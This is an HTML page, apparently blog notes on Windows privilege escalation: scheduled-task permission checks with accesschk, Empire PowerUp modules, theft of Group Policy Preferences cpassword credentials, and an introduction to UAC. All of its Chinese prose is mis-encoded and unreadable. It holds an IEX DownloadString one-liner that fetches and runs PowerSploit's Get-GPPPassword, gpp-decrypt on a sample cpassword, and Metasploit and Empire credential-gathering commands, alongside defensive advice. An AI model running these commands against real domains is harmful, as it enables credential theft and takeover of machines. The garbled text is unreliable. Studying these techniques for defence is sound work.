<span class="hljs-comment">#åˆ—å‡ºAuthenticatedUsersè´¦æˆ·çš„åœ¨Cç›˜ä¸‹çš„ç¼ºé™·æƒé™é…ç½®</span>
accesschk.exe <span class="hljs-literal">-uwqs</span> <span class="hljs-string">&quot;AuthenticatedUsers&quot;</span> c:\*.*</code></pre>

<p>å‚æ•°è¯´æ˜ï¼š</p>
<pre><code class="hljs powershell"><span class="hljs-literal">-d</span>	ä»…å¤„ç†ç›®å½•æˆ–é¡¶çº§é”®
<span class="hljs-literal">-e</span>	ä»…æ˜¾ç¤ºæ˜ç¡®è®¾ç½®çš„å®Œæ•´æ€§çº§åˆ«ï¼ˆä»…é™ Windows Vista å’Œæ›´é«˜ç‰ˆæœ¬ï¼‰
<span class="hljs-literal">-q</span>	çœç•¥æ¨ªå¹…
<span class="hljs-literal">-r</span>	ä»…æ˜¾ç¤ºå…·æœ‰è¯»å–æƒé™çš„å¯¹è±¡
<span class="hljs-literal">-s</span>	é€’å½’
<span class="hljs-literal">-t</span>	å¯¹è±¡ç±»å‹è¿‡æ»¤å™¨ï¼Œä¾‹å¦‚<span class="hljs-string">&quot;section&quot;</span>
<span class="hljs-literal">-u</span>	æŠ‘åˆ¶é”™è¯¯
<span class="hljs-literal">-v</span>	è¯¦ç»†ï¼ˆåŒ…æ‹¬ Windows Vista å®Œæ•´æ€§çº§åˆ«ï¼‰
<span class="hljs-literal">-w</span>	ä»…æ˜¾ç¤ºå…·æœ‰å†™å…¥æƒé™çš„å¯¹è±¡
â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ï¼ˆä¸å†ä¸€ä¸€åˆ—ä¸¾ï¼‰</code></pre>

<ul>
<li>ç›®æ ‡ç¯å¢ƒæœ‰python3ç¯å¢ƒæ—¶å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è„šæœ¬è¿›è¡Œæ‰¹é‡æŸ¥æ‰¾</li>
</ul>
<p>å¯ä»¥ç›´æ¥å¯¹è¦æ‰§è¡Œçš„è®¡åˆ’ä»»åŠ¡è¿›è¡Œç­›é€‰ï¼ˆè®¡åˆ’ä»»åŠ¡æ¨¡å¼ä¸èƒ½ä¸ºå·²ç¦ç”¨ï¼‰ï¼Œé»˜è®¤ç”Ÿæˆ<code>only_task_path.txt</code>(ä¿å­˜è®¡åˆ’ä»»åŠ¡è·¯å¾„ä¿¡æ¯)ä»¥åŠ<code>all_check.txt</code>ï¼ˆæ‰€æœ‰çš„æ£€æŸ¥ç»“æœï¼‰ã€‚</p>
<p>repo: <a target="_blank" rel="noopener" href="https://github.com/SevenC-base/PostExploitation/tree/master/windows/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83%E6%A3%80%E6%9F%A5%E8%84%9A%E6%9C%AC/AccessChk">https://github.com/SevenC-base/PostExploitation/tree/master/windows/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83%E6%A3%80%E6%9F%A5%E8%84%9A%E6%9C%AC/AccessChk</a></p>
<pre><code class="hljs powershell">python3 schtasks_check.py</code></pre>

<ul>
<li>åœ¨ç›®æ ‡æœºå™¨æ²¡æœ‰pythonç¯å¢ƒæ—¶ï¼Œå¯ä»¥å¯¼å‡ºè®¡åˆ’ä»»åŠ¡è¯¦æƒ…ï¼Œåœ¨æœ¬æœºç”¨ä»¥ä¸Šè„šæœ¬ç”Ÿæˆå•ç‹¬çš„è®¡åˆ’ä»»åŠ¡è·¯å¾„ä¿¡æ¯ï¼Œä¹‹åä¸Šæ¬¡ç›®æ ‡æœºå™¨ä½¿ç”¨æ‰¹å¤„ç†å¯¹è·¯å¾„è¿›è¡Œæ£€æŸ¥ã€‚</li>
</ul>
<pre><code class="hljs powershell"><span class="hljs-comment"># å¯¼å‡ºç›®æ ‡æœºå™¨è®¡åˆ’ä»»åŠ¡æƒ…å†µï¼Œæ³¨æ„æ–‡ä»¶ç¼–ç è°ƒæ•´ä¸ºUTF-8</span>
schtasks /query /fo LIST /v &gt; task.txt
<span class="hljs-comment"># é»˜è®¤ç”Ÿæˆonly_task_path.txtä¿å­˜è®¡åˆ’ä»»åŠ¡è·¯å¾„ä¿¡æ¯</span>
python3 schtasks_check.py <span class="hljs-operator">-f</span> task.txt</code></pre>

<p>ä¹‹åå»ç›®æ ‡æœºå™¨è¿è¡Œæ‰¹å¤„ç†ï¼Œæ³¨æ„è¦æœ‰ï¼š<code>accesschk.exe</code></p>
<pre><code class="hljs powershell">@<span class="hljs-built_in">echo</span> off 
<span class="hljs-keyword">for</span> /f %%i <span class="hljs-keyword">in</span> (only_task_path.txt) <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> %%i &amp;&amp; accesschk.exe  /accepteula <span class="hljs-literal">-uwqv</span> %%i 
pause</code></pre>



<h3 id="4-2-6-Empire-å†…ç½®æ¨¡å—"><a href="#4-2-6-Empire-å†…ç½®æ¨¡å—" class="headerlink" title="4.2.6 Empire å†…ç½®æ¨¡å—"></a>4.2.6 Empire å†…ç½®æ¨¡å—</h3><p><code>Empire</code> å†…ç½®äº† <code>PowerUp</code> çš„éƒ¨åˆ†æ¨¡å—ã€‚è¾“å…¥<code>usemodule privesc/powerup</code>å‘½ä»¤ï¼Œç„¶åæŒ‰<code>Tab</code>é”®ï¼ŒæŸ¥çœ‹<code>PowerUp</code>çš„æ¨¡å—åˆ—è¡¨ã€‚</p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220126223637695.png" alt="image-20220126223637695"></p>
<p><code>AIIChecks</code> æ¨¡å—ç”¨äºæŸ¥æ‰¾ç³»ç»Ÿä¸­çš„æ¼æ´ã€‚<code>AllChecks</code> æ¨¡å—å¯ç”¨äºæ‰§è¡Œè„šæœ¬ã€æ£€æŸ¥ç³»ç»Ÿæ¼æ´ã€‚</p>
<pre><code class="hljs ruby">usemodule privesc/powerup/allchecks
execute</code></pre>

<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220126230507949.png" alt="image-20220126230507949"></p>
<p><code>AllChecks</code>æ¨¡å—çš„åº”ç”¨å¯¹è±¡å¦‚ä¸‹:</p>
<ul>
<li>æ²¡æœ‰è¢«å¼•å·å¼•èµ·æ¥çš„æœåŠ¡çš„è·¯å¾„</li>
<li><code>ACL</code> é…ç½®é”™è¯¯çš„æœåŠ¡ï¼ˆæ”»å‡»è€…é€šå¸¸é€šè¿‡<code>service_*</code>åˆ©ç”¨å®ƒï¼‰</li>
<li>æœåŠ¡çš„å¯æ‰§è¡Œæ–‡ä»¶çš„æƒé™è®¾ç½®ä¸å½“ï¼ˆæ”»å‡»è€…é€šå¸¸é€šè¿‡<code>service_exe_*</code>åˆ©ç”¨å®ƒï¼‰</li>
<li><code>Unattend.xml</code> æ–‡ä»¶</li>
<li>æ³¨å†Œè¡¨é”®<code>AlwaysInstallElevated</code></li>
<li>å¦‚æœæœ‰<code> Autologon</code>å‡­è¯ï¼Œéƒ½ä¼šç•™åœ¨æ³¨å†Œè¡¨ä¸­</li>
<li>åŠ å¯†çš„ <code>web.config</code> å­—ç¬¦ä¸²å’Œåº”ç”¨ç¨‹åºæ± çš„å¯†ç ã€‚</li>
<li><code>%PATH%.DLL</code>çš„åŠ«æŒæœºä¼šï¼ˆæ”»å‡»è€…é€šå¸¸é€šè¿‡ <code>write_dllhijacker</code> åˆ©ç”¨å®ƒï¼‰</li>
</ul>
<h2 id="4-3-ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒåˆ†æåŠé˜²èŒƒ"><a href="#4-3-ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒåˆ†æåŠé˜²èŒƒ" class="headerlink" title="4.3 ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒåˆ†æåŠé˜²èŒƒ"></a>4.3 ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒåˆ†æåŠé˜²èŒƒ</h2><h3 id="4-3-1-ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒç®€ä»‹"><a href="#4-3-1-ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒç®€ä»‹" class="headerlink" title="4.3.1 ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒç®€ä»‹"></a>4.3.1 ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒç®€ä»‹</h3><p>â€‹        <code>SYSVOL</code>æ˜¯æ´»åŠ¨ç›®å½•é‡Œé¢çš„ä¸€ä¸ªç”¨äºå­˜å‚¨åŸŸå…¬å…±æ–‡ä»¶æœåŠ¡å™¨å‰¯æœ¬çš„å…±äº«æ–‡ä»¶å¤¹ï¼Œåœ¨åŸŸä¸­çš„æ‰€æœ‰åŸŸæ§åˆ¶å™¨ä¹‹é—´è¿›è¡Œå¤åˆ¶ã€‚<code>SYSVOL</code>æ–‡ä»¶å¤¹æ˜¯åœ¨å®‰è£…æ´»åŠ¨ç›®å½•æ—¶è‡ªåŠ¨åˆ›å»ºçš„ï¼Œä¸»è¦ç”¨æ¥å­˜æ”¾ç™»å½•è„šæœ¬ã€ç»„ç­–ç•¥æ•°æ®åŠå…¶ä»–åŸŸæ§åˆ¶å™¨éœ€è¦çš„åŸŸä¿¡æ¯ç­‰ã€‚<code>SYSVOL</code>åœ¨æ‰€æœ‰ç»è¿‡èº«ä»½éªŒè¯çš„åŸŸç”¨æˆ·æˆ–è€…åŸŸä¿¡ä»»ç”¨æˆ·å…·æœ‰è¯»æƒé™çš„æ´»åŠ¨ç›®å½•çš„åŸŸèŒƒå›´å†…å…±äº«ï¼Œæ•´ä¸ª<code>SYSVOL</code>ç›®å½•åœ¨æ‰€æœ‰çš„åŸŸæ§åˆ¶å™¨ä¸­æ˜¯è‡ªåŠ¨åŒæ­¥å’Œå…±äº«çš„ï¼Œæ‰€æœ‰çš„åŸŸç­–ç•¥å‡å­˜æ”¾åœ¨ä»¥ä¸‹ç›®å½•ä¸­ã€‚</p>
<pre><code class="hljs powershell">C:\Windows\SYSVOL\DOMAIN\Policies\</code></pre>

<p>åœ¨ä¸€èˆ¬çš„åŸŸç¯å¢ƒä¸­ï¼Œæ‰€æœ‰æœºå™¨éƒ½æ˜¯è„šæœ¬åŒ–æ‰¹é‡éƒ¨ç½²çš„ï¼Œæ•°æ®é‡é€šå¸¸å¾ˆå¤§ã€‚ä¸ºäº†æ–¹ä¾¿åœ°å¯¹æ‰€æœ‰çš„æœºå™¨è¿›è¡Œæ“ä½œï¼Œç½‘ç»œç®¡ç†å‘˜å¾€å¾€ä¼šä½¿ç”¨åŸŸç­–ç•¥è¿›è¡Œç»Ÿä¸€çš„é…ç½®å’Œç®¡ç†ã€‚å¤§å¤šæ•°ç»„ç»‡åœ¨åˆ›å»ºåŸŸç¯å¢ƒåï¼Œä¼šè¦æ±‚åŠ äººåŸŸçš„è®¡ç®—æœºä½¿ç”¨åŸŸç”¨æˆ·å¯†ç è¿›è¡Œç™»å½•éªŒè¯ã€‚ä¸ºäº†ä¿è¯æœ¬åœ°ç®¡ç†å‘˜å¯†ç çš„å®‰å…¨æ€§ï¼Œè¿™äº›ç»„ç»‡çš„ç½‘ç»œç®¡ç†å‘˜å¾€å¾€ä¼šä¿®æ”¹æœ¬åœ°ç®¡ç†å‘˜å¯†ç ã€‚å°½ç®¡å¦‚æ­¤ï¼Œå®‰å…¨é—®é¢˜ä¾æ—§å­˜åœ¨ã€‚é€šè¿‡ç»„ç­–ç•¥ç»Ÿä¸€ä¿®æ”¹çš„å¯†ç ï¼Œè™½ç„¶å¼ºåº¦æœ‰æ‰€æé«˜ï¼Œä½†æ‰€æœ‰æœºå™¨çš„æœ¬åœ°ç®¡ç†å‘˜å¯†ç æ˜¯ç›¸åŒçš„ã€‚æ”»å‡»è€…è·å¾—äº†ä¸€å°æœºå™¨çš„æœ¬åœ°ç®¡ç†å‘˜å¯†ç ï¼Œå°±ç›¸å½“äºè·å¾—äº†æ•´ä¸ªåŸŸä¸­æ‰€æœ‰æœºå™¨çš„æœ¬åœ°ç®¡ç†å‘˜å¯†ç ã€‚</p>
<p>å¸¸è§çš„ç»„ç­–ç•¥é¦–é€‰é¡¹ï¼ˆ<code>Group Policy Preferences,GPP</code>ï¼‰å¦‚ä¸‹ï¼š</p>
<ul>
<li>æ˜ å°„é©±åŠ¨å™¨ï¼ˆ<code>Drives.xml</code>ï¼‰</li>
<li>åˆ›å»ºæœ¬åœ°ç”¨æˆ·</li>
<li>æ•°æ®æºï¼ˆ<code>DataSources.xml</code>ï¼‰</li>
<li>æ‰“å°æœºé…ç½®ï¼ˆ<code>Printers.xml</code>ï¼‰</li>
<li>åˆ›å»º/æ›´æ–°æœåŠ¡ï¼ˆ<code>Services.xml</code>ï¼‰</li>
<li>è®¡åˆ’ä»»åŠ¡ï¼ˆ<code>ScheduledTasks.xml</code>ï¼‰</li>
</ul>
<h3 id="4-3-2-ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒåˆ†æ"><a href="#4-3-2-ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒåˆ†æ" class="headerlink" title="4.3.2 ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒåˆ†æ"></a>4.3.2 ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒåˆ†æ</h3><h4 id="1-åˆ›å»ºç»„ç­–ç•¥"><a href="#1-åˆ›å»ºç»„ç­–ç•¥" class="headerlink" title="1. åˆ›å»ºç»„ç­–ç•¥"></a>1. åˆ›å»ºç»„ç­–ç•¥</h4><p><code>Win + R</code> è¿è¡Œ <code>gpedit.msc</code>(<code>windows2003</code>çš„è¯å°±æ˜¯<code>dsa.msc</code>)ï¼Œå³é”®ç»„ç­–ç•¥å¯¹è±¡æ–°å»ºtestï¼š</p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220127115548152.png" alt="(image-20220127115548152)"></p>
<p>ä¹‹åç¼–è¾‘ï¼Œé€‰æ‹©æ›´æ–°å†…ç½®çš„administratorå¯†ç ï¼Œä¸è¿‡æµ‹è¯•ä¸‹æ¥æœ¬åœ°ç®¡ç†å‘˜è´¦æˆ·å¯†ç å¹¶æ²¡æœ‰è¢«ä¿®æ”¹ï¼Œåˆ·æ–°ç­–ç•¥ä¹Ÿæ²¡ç”¨ï¼Œæš‚æœªæ‰¾åˆ°åŸå› ï¼Œæœ‰äº†è§£çš„å¤§å“¥å¯ä»¥æŒ‡ç‚¹ä¸€ä¸‹ã€‚</p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220127222254536.png" alt="image-20220127222254536"></p>
<h4 id="2-è·å–ç»„ç­–ç•¥å‡­æ®"><a href="#2-è·å–ç»„ç­–ç•¥å‡­æ®" class="headerlink" title="2. è·å–ç»„ç­–ç•¥å‡­æ®"></a>2. è·å–ç»„ç­–ç•¥å‡­æ®</h4><p>â€‹        ç®¡ç†å‘˜åœ¨åŸŸä¸­æ–°å»ºä¸€ä¸ªç»„ç­–ç•¥åï¼Œæ“ä½œç³»ç»Ÿä¼šè‡ªåŠ¨åœ¨ <code>SYSVOL</code> å…±äº«ç›®å½•ä¸­ç”Ÿæˆä¸€ä¸ª <code>XML</code>æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶ä¸­ä¿å­˜äº†è¯¥ç»„ç­–ç•¥æ›´æ–°åçš„å¯†ç ã€‚è¯¥å¯†ç ä½¿ç”¨<code>AES-256</code>åŠ å¯†ç®—æ³•ï¼Œå®‰å…¨æ€§è¿˜æ˜¯æ¯”è¾ƒé«˜çš„ã€‚ä½†æ˜¯ï¼Œ2012å¹´å¾®è½¯åœ¨å®˜æ–¹ç½‘ç«™ä¸Šå…¬å¸ƒäº†è¯¥å¯†ç çš„ç§é’¥ï¼Œå¯¼è‡´ä¿å­˜åœ¨<code>XML</code>æ–‡ä»¶ä¸­çš„å¯†ç çš„å®‰å…¨æ€§å¤§å¤§é™ä½ã€‚ä»»ä½•åŸŸç”¨æˆ·å’ŒåŸŸä¿¡ä»»çš„ç”¨æˆ·å‡å¯å¯¹è¯¥å…±äº«ç›®æ ‡è¿›è¡Œè®¿é—®ï¼Œè¿™å°±æ„å‘³ç€ï¼Œä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥è®¿é—®ä¿å­˜åœ¨ <code>XML</code> æ–‡ä»¶ä¸­çš„å¯†ç å¹¶å°†å…¶è§£å¯†ï¼Œä»è€Œæ§åˆ¶åŸŸä¸­æ‰€æœ‰ä½¿ç”¨è¯¥è´¦æˆ·/å¯†ç çš„æœ¬åœ°ç®¡ç†å‘˜è®¡ç®—æœºã€‚åœ¨<code> SYSVOL</code> ä¸­æœç´¢ï¼Œå¯ä»¥æ‰¾åˆ°åŒ…å« <code>cpassword</code> çš„ XML æ–‡ä»¶ã€‚</p>
<h5 id="2-1-æ‰‹åŠ¨æŸ¥æ‰¾"><a href="#2-1-æ‰‹åŠ¨æŸ¥æ‰¾" class="headerlink" title="2.1 æ‰‹åŠ¨æŸ¥æ‰¾"></a>2.1 æ‰‹åŠ¨æŸ¥æ‰¾</h5><p>è¿œç¨‹è¿æ¥å…±äº«æŸ¥çœ‹ï¼š</p>
<pre><code class="hljs powershell"><span class="hljs-built_in">type</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">2.20</span>\sysvol\test.com\Policies\&#123;<span class="hljs-number">31</span>B2F340<span class="hljs-literal">-016D</span><span class="hljs-literal">-11D2</span><span class="hljs-literal">-945F</span><span class="hljs-literal">-00C04FB984F9</span>&#125;\MACHINE\Preferences\Groups\Groups.xml</code></pre>

<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220128093720830.png" alt="image-20220128093720830"></p>
<p>å¯¹<code>cpassword</code>å­—æ®µè§£å¯†ï¼š</p>
<pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> kaliè‡ªå¸¦å·¥å…·</span>
gpp-decrypt 7ud2rxJhwxT5iaNrNltLxTsE79YZ9JxpZ3rL7k9HJQ0</code></pre>

<p>ä½¿ç”¨<code>ruby</code>è„šæœ¬è§£å¯†ä¹Ÿå¯ä»¥ï¼Œrepo:<a target="_blank" rel="noopener" href="https://github.com/SevenC-base/PostExploitation/tree/master/windows/%E7%BB%84%E7%AD%96%E7%95%A5%E6%8F%90%E6%9D%83%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC">https://github.com/SevenC-base/PostExploitation/tree/master/windows/%E7%BB%84%E7%AD%96%E7%95%A5%E6%8F%90%E6%9D%83%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC</a></p>
<h5 id="2-2-å€ŸåŠ©PowerSploitçš„è„šæœ¬Get-GPPPassword-ps1"><a href="#2-2-å€ŸåŠ©PowerSploitçš„è„šæœ¬Get-GPPPassword-ps1" class="headerlink" title="2.2 å€ŸåŠ©PowerSploitçš„è„šæœ¬Get-GPPPassword.ps1"></a>2.2 å€ŸåŠ©<code>PowerSploit</code>çš„è„šæœ¬<code>Get-GPPPassword.ps1</code></h5><p>repo:<a target="_blank" rel="noopener" href="https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1">https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1</a></p>
<pre><code class="hljs powershell"><span class="hljs-comment"># è¿œç¨‹åŠ è½½ï¼Œä¼šè¢« Windows defender æŸ¥æ€</span>
powershell <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1&#x27;);Get-GPPPassword&quot;</span>
<span class="hljs-comment"># æœ¬åœ°æ‰§è¡Œ</span>
<span class="hljs-built_in">Import-Module</span> .\<span class="hljs-built_in">Get-GPPPassword</span>.ps1;<span class="hljs-built_in">Get-GPPPassword</span></code></pre>

<h5 id="2-3-å€ŸåŠ©-metasploit"><a href="#2-3-å€ŸåŠ©-metasploit" class="headerlink" title="2.3 å€ŸåŠ© metasploit"></a>2.3 å€ŸåŠ© <code>metasploit</code></h5><pre><code class="hljs shell">use post/windows/gather/credentials/gpp
set session 1
run</code></pre>

<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220128112649121.png" alt="image-20220128112649121"></p>
<h5 id="2-5-å€ŸåŠ©Empireæ¨¡å—privesc-gpp"><a href="#2-5-å€ŸåŠ©Empireæ¨¡å—privesc-gpp" class="headerlink" title="2.5 å€ŸåŠ©Empireæ¨¡å—privesc/gpp"></a>2.5 å€ŸåŠ©<code>Empire</code>æ¨¡å—<code>privesc/gpp</code></h5><pre><code class="hljs shell">usemodule privesc/gpp</code></pre>

<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220128140629730.png" alt="image-20220128140629730"></p>
<p>é™¤äº† <code>Groups.xml</code>ï¼Œè¿˜æœ‰å‡ ä¸ªç»„ç­–ç•¥é¦–é€‰é¡¹æ–‡ä»¶ä¸­æœ‰å¯é€‰çš„ <code>cpassword </code>å±æ€§ï¼Œåˆ—ä¸¾å¦‚ä¸‹:</p>
<ul>
<li><code>Services\Services.xml</code></li>
<li><code>ScheduledTasks\ScheduledTasks.xml</code></li>
<li><code>Printers\Printers.xml</code></li>
<li><code>Drives\Drives.xml</code></li>
<li><code>DataSources\DataSources.xml</code></li>
</ul>
<h3 id="4-4-3-é’ˆå¯¹ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒçš„é˜²å¾¡"><a href="#4-4-3-é’ˆå¯¹ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒçš„é˜²å¾¡" class="headerlink" title="4.4.3 é’ˆå¯¹ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒçš„é˜²å¾¡"></a>4.4.3 é’ˆå¯¹ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒçš„é˜²å¾¡</h3><p>åœ¨ç”¨äºç®¡ç†ç»„ç­–ç•¥çš„è®¡ç®—æœºä¸Šå®‰è£… <code>KB2962486</code> è¡¥ä¸ï¼Œé˜²æ­¢æ–°çš„å‡­æ®è¢«æ”¾ç½®åœ¨ç»„ç­–ç•¥é¦–é€‰é¡¹ä¸­ã€‚å¾®è½¯åœ¨2014å¹´ä¿®å¤äº†ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒæ¼æ´ï¼Œä½¿ç”¨çš„æ–¹æ³•å°±æ˜¯ä¸å†å°†å¯†ç ä¿å­˜åœ¨ç»„ç­–ç•¥é¦–é€‰é¡¹ä¸­ã€‚æ­¤å¤–ï¼Œéœ€è¦å¯¹Everyone è®¿é—®æƒé™è¿›è¡Œè®¾ç½®ï¼Œå…·ä½“å¦‚ä¸‹:</p>
<ul>
<li>è®¾ç½®å…±äº«æ–‡ä»¶å¤¹<code>SYSVOL</code>çš„è®¿é—®æƒé™ã€‚</li>
<li>å°†åŒ…å«ç»„ç­–ç•¥å¯†ç çš„<code>XML</code>æ–‡ä»¶ä»<code>SYSVOL</code>ç›®å½•ä¸­åˆ é™¤ã€‚</li>
<li>ä¸è¦æŠŠå¯†ç æ”¾åœ¨æ‰€æœ‰åŸŸç”¨æˆ·éƒ½æœ‰æƒè®¿é—®çš„æ–‡ä»¶ä¸­ã€‚</li>
<li>å¦‚æœéœ€è¦æ›´æ”¹åŸŸä¸­æœºå™¨çš„æœ¬åœ°ç®¡ç†å‘˜å¯†ç ï¼Œå»ºè®®ä½¿ç”¨<code>LAPS</code>ã€‚</li>
</ul>
<h2 id="4-4-ç»•è¿‡UAC-ææƒåˆ†æåŠé˜²èŒƒ"><a href="#4-4-ç»•è¿‡UAC-ææƒåˆ†æåŠé˜²èŒƒ" class="headerlink" title="4.4 ç»•è¿‡UAC ææƒåˆ†æåŠé˜²èŒƒ"></a>4.4 ç»•è¿‡UAC ææƒåˆ†æåŠé˜²èŒƒ</h2><p>å¦‚æœè®¡ç®—æœºçš„æ“ä½œç³»ç»Ÿç‰ˆæœ¬æ˜¯<code>Windows Vista</code>æˆ–æ›´é«˜ï¼Œåœ¨æƒé™ä¸å¤Ÿçš„æƒ…å†µä¸‹ï¼Œè®¿é—®ç³»ç»Ÿç£ç›˜çš„æ ¹ç›®å½•ï¼ˆä¾‹å¦‚<code>Cï¼š\\Windows</code>ç›®å½•ã€<code>Program Files</code> ç›®å½•ï¼Œä»¥åŠè¯»ã€å†™ç³»ç»Ÿç™»å½•æ•°æ®åº“ï¼ˆ<code>Registry</code>ï¼‰çš„ç¨‹åºç­‰æ“ä½œï¼Œéƒ½éœ€è¦ç»è¿‡ <code>UAC</code>ï¼ˆ<code>User Account Control</code>ï¼Œç”¨æˆ·è´¦æˆ·æ§åˆ¶ï¼‰çš„è®¤è¯æ‰èƒ½è¿›è¡Œã€‚</p>
<h3 id="4-4-1-UACç®€ä»‹"><a href="#4-4-1-UACç®€ä»‹" class="headerlink" title="4.4.1 UACç®€ä»‹"></a>4.4.1 UACç®€ä»‹</h3><p>â€‹        <code>UAC</code>æ˜¯å¾®è½¯ä¸ºæé«˜ç³»ç»Ÿå®‰å…¨æ€§åœ¨<code>Windows Vista</code>ä¸­å¼•äººçš„æŠ€æœ¯ã€‚<code>UAC</code> è¦æ±‚ç”¨æˆ·åœ¨æ‰§è¡Œå¯èƒ½å½±å“è®¡ç®—æœºè¿è¡Œçš„æ“ä½œæˆ–è€…åœ¨è¿›è¡Œå¯èƒ½å½±å“å…¶ä»–ç”¨æˆ·çš„è®¾ç½®ä¹‹å‰ï¼Œæ‹¥æœ‰ç›¸åº”çš„æƒé™æˆ–è€…ç®¡ç†å‘˜å¯†ç ã€‚<code>UAC</code>åœ¨æ“ä½œå¯åŠ¨å‰å¯¹ç”¨æˆ·èº«ä»½è¿›è¡ŒéªŒè¯ï¼Œä»¥é¿å…æ¶æ„è½¯ä»¶å’Œé—´è°è½¯ä»¶åœ¨æœªç»è®¸å¯çš„æƒ…å†µä¸‹åœ¨è®¡ç®—æœºä¸Šè¿›è¡Œå®‰è£…æ“ä½œæˆ–è€…å¯¹è®¡ç®—æœºè®¾ç½®è¿›è¡Œæ›´æ”¹ã€‚</p>
<p>â€‹        åœ¨ <code>Windows Vista</code> åŠæ›´é«˜ç‰ˆæœ¬çš„æ“ä½œç³»ç»Ÿä¸­ï¼Œå¾®è½¯è®¾ç½®äº†å®‰å…¨æ§åˆ¶ç­–ç•¥ï¼Œåˆ†ä¸ºé«˜ã€ä¸­ã€ä½ä¸‰ä¸ªç­‰çº§ã€‚é«˜ç­‰çº§çš„è¿›ç¨‹æœ‰ç®¡ç†å‘˜æƒé™ï¼›ä¸­ç­‰çº§çš„è¿›ç¨‹æœ‰æ™®é€šç”¨æˆ·æƒé™ï¼›ä½ç­‰çº§çš„è¿›ç¨‹ï¼Œæƒé™æ˜¯æœ‰é™çš„ï¼Œä»¥ä¿è¯ç³»ç»Ÿåœ¨å—åˆ°å®‰å…¨å¨èƒæ—¶é€ æˆçš„æŸå®³æœ€å°ã€‚</p>
<p>éœ€è¦<code>UAC</code>çš„æˆæƒæ‰èƒ½è¿›è¡Œçš„æ“ä½œåˆ—ä¸¾å¦‚ä¸‹:</p>
<ul>
<li>é…ç½®<code> Windows Update</code></li>
<li>å¢åŠ /åˆ é™¤è´¦æˆ·ã€‚</li>
<li>æ›´æ”¹è´¦æˆ·ç±»å‹ã€‚</li>
<li>æ›´æ”¹<code>UAC</code>çš„è®¾ç½®ã€‚</li>
<li>å®‰è£… <code>ActiveX</code>ã€‚</li>
<li>å®‰è£…/å¸è½½ç¨‹åºã€‚</li>
<li>å®‰è£…è®¾å¤‡é©±åŠ¨ç¨‹åºã€‚</li>
<li>å°†æ–‡ä»¶ç§»åŠ¨/å¤åˆ¶åˆ°<code>Program Files</code>æˆ–<code>Windows</code>ç›®å½•ä¸‹ã€‚</li>
<li>æŸ¥çœ‹å…¶ä»–ç”¨æˆ·çš„æ–‡ä»¶å¤¹ã€‚</li>
</ul>
<p><code>UAC</code> æœ‰å¦‚ä¸‹å››ç§è®¾ç½®è¦æ±‚:</p>
<ul>
<li>å§‹ç»ˆé€šçŸ¥ï¼šè¿™æ˜¯æœ€ä¸¥æ ¼çš„è®¾ç½®ï¼Œæ¯å½“æœ‰ç¨‹åºéœ€è¦ä½¿ç”¨é«˜çº§åˆ«çš„æƒé™æ—¶éƒ½ä¼šæç¤ºæœ¬åœ°ç”¨æˆ·ã€‚</li>
<li>ä»…åœ¨ç¨‹åºè¯•å›¾æ›´æ”¹æˆ‘çš„è®¡ç®—æœºæ—¶é€šçŸ¥æˆ‘ï¼šè¿™æ˜¯UACçš„é»˜è®¤è®¾ç½®ã€‚å½“æœ¬åœ°Windowsç¨‹åºè¦<br>ä½¿ç”¨é«˜çº§åˆ«çš„æƒé™æ—¶ï¼Œä¸ä¼šé€šçŸ¥ç”¨æˆ·ã€‚ä½†æ˜¯ï¼Œå½“ç¬¬ä¸‰æ–¹ç¨‹åºè¦ä½¿ç”¨é«˜çº§åˆ«çš„æƒé™æ—¶ï¼Œä¼šæ<br>ç¤ºæœ¬åœ°ç”¨æˆ·ã€‚</li>
<li>ä»…åœ¨ç¨‹åºè¯•å›¾æ›´æ”¹æˆ‘çš„è®¡ç®—æœºæ—¶é€šçŸ¥æˆ‘ï¼ˆä¸é™ä½æ¡Œé¢çš„äº®åº¦ï¼‰ï¼šä¸ä¸Šä¸€æ¡è®¾ç½®çš„è¦æ±‚ç›¸åŒï¼Œ<br>ä½†åœ¨æç¤ºç”¨æˆ·æ—¶ä¸é™ä½æ¡Œé¢çš„äº®åº¦ã€‚</li>
